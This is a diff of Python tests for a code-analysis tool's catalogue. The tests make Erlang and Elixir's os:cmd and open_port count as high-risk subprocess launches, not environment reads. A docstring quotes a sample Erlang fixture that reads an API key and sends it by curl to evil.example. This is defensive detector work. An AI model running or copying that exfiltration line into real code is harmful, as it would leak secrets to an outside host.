@@ -5313,3 +5313,116 @@ class TestGrpcRpcImplementationTraceability:
         assert rev.get("py:server:1-1:impl:function") == {
             "py:client:1-1:call:function"}
         assert "py:y:1-1:i:function" not in rev
+
+
+class TestTheBeamShellOutIsASubprocessNotAnEnvRead:
+    """WI-jupaf. ``os:cmd/1`` is Erlang's shell-out — it runs a command through
+    the OS shell — and it was catalogued as an ENVIRONMENT READ and WRITE,
+    sitting beside ``getenv`` and ``putenv``. It looks like ``cmd`` was swept
+    along with the rest of the ``os`` module.
+
+    MEASURED ON THE SHIPPED CLI BEFORE THE FIX, which is what turns this from a
+    tidiness complaint into a false-confirm:
+
+        -module(leak).
+        handler() ->
+            Secret = os:getenv("API_KEY"),
+            os:cmd("curl -d " ++ Secret ++ " https://evil.example/p").
+
+        claim {boundary: subprocess, must_not_exist: true}
+          -> Verdict: CONFIRMED, rc 0, "No subprocess chains found."
+
+    The call is not invisible — that would merely be a recall miss. It is
+    CLASSIFIED, as ``env_read``, and since INV-buzab a classified call is what
+    ``examined`` means. So the exfiltration is reported as an EXAMINED NEGATIVE
+    for the boundary that is actually true, with ``high_risk: false``. That is
+    the INV-gahuz / INV-larol shape reached from the opposite direction: there a
+    row STRIPPED opacity a launch needed, here a row asserts the wrong kind of
+    I/O entirely.
+
+    A first version of this measurement was confounded and is recorded because
+    the confound flattered the tool: a fixture that ALSO called
+    ``erlang:open_port`` returned ``inconclusive`` rc 2 — not because the launch
+    was detected, but because ``erlang`` is itself an uncatalogued module and
+    tripped the coverage gate. Removing ``open_port`` isolates ``os:cmd`` and
+    the verdict is a clean false ``confirmed``.
+
+    EMISSION SHAPE WAS MEASURED FIRST, as the item demanded, because adding rows
+    the analyzer can never match is a ceiling rather than a payoff (INV-linub's
+    L2-only fix measured as a win at the analyzer and produced zero findings).
+    The Erlang analyzer emits ``erlang:os:0-0:cmd:external_symbol`` with
+    ``call_construct='remote_external'`` — module slot ``os``, name slot
+    ``cmd`` — and the POSITIVE CONTROL is that the existing (wrong) row already
+    matches it end to end, producing an ``env_read`` chain. The key resolves;
+    only the boundary was wrong.
+    """
+
+    def test_erlang_os_cmd_is_a_subprocess_launch(self) -> None:
+        cat = load_catalog("erlang")
+        got = cat.lookup_with_module("os.cmd", "os")
+        assert got is not None, "os.cmd must stay catalogued — this is a RE-KEY"
+        assert got.boundary == "subprocess", (
+            f"os:cmd/1 runs a command through the OS shell; it is not an "
+            f"environment read. Got boundary={got.boundary!r}"
+        )
+
+    def test_erlang_open_port_is_a_subprocess_launch(self) -> None:
+        """``erlang:open_port/2`` is the other launch primitive, and the one
+        ``os:cmd`` is implemented on top of. It was catalogued nowhere at all,
+        so it produced no chain of any kind.
+        """
+        cat = load_catalog("erlang")
+        got = cat.lookup_with_module("erlang.open_port", "erlang")
+        assert got is not None, "erlang:open_port/2 was catalogued nowhere"
+        assert got.boundary == "subprocess"
+
+    def test_elixir_inherits_the_fix_rather_than_repeating_it(self) -> None:
+        """PARITY over the BEAM family, and the reason this is ONE catalogue
+        edit and not two.
+
+        Elixir carries its own ``subprocess`` section for ``System.cmd`` /
+        ``Port.open`` and does NOT declare ``os.cmd`` — yet a census measured it
+        resolving ``os.cmd`` to ``env_read`` exactly as Erlang did, because
+        elixir inherits the erlang catalogue (the same child-over-parent
+        mechanism scala uses for java). An Elixir program calling ``:os.cmd/1``,
+        which is idiomatic BEAM interop, sat in precisely the state the item
+        described for Erlang.
+
+        This test is what keeps the two languages from drifting: it asserts the
+        inherited answer, so a future edit that fixes only the child leaves the
+        parent's defect visible here.
+        """
+        got = load_catalog("elixir").lookup_with_module("os.cmd", "os")
+        assert got is not None
+        assert got.boundary == "subprocess", (
+            f"elixir inherits erlang's os module; :os.cmd/1 must be a launch "
+            f"there too. Got {got.boundary!r}"
+        )
+
+    def test_the_shell_out_is_marked_high_risk(self) -> None:
+        """``subprocess`` is flagged ``*** HIGH RISK ***`` on the invariant that
+        launching an external program is arbitrary code execution. Losing the
+        boundary lost the marking too, so re-keying without this would fix the
+        chain and leave the warning missing.
+        """
+        assert is_high_risk("os.cmd")
+        assert is_high_risk("erlang.open_port")
+
+    def test_cmd_is_no_longer_reachable_as_an_env_boundary(self) -> None:
+        """THE HALF A RE-KEY CAN SILENTLY SKIP. Adding a ``subprocess`` row while
+        leaving the ``env_read`` / ``env_write`` rows in place would make
+        ``os.cmd`` a MULTI-BOUNDARY primitive, and INV-zumin measured what
+        happens then: ``lookup_with_module`` returns one row decided by YAML
+        order, so the fix would be live or inert depending on where it was
+        pasted. The env rows are REMOVED, not supplemented.
+        """
+        for lang in ("erlang", "elixir"):
+            boundaries = {
+                p.boundary for p in load_catalog(lang).primitives
+                if p.qualified_name == "os.cmd"
+            }
+            assert boundaries == {"subprocess"}, (
+                f"{lang}: os.cmd must be declared under subprocess ALONE, or "
+                f"row order decides which declaration survives (INV-zumin). "
+                f"Got {sorted(boundaries)}"
+            )
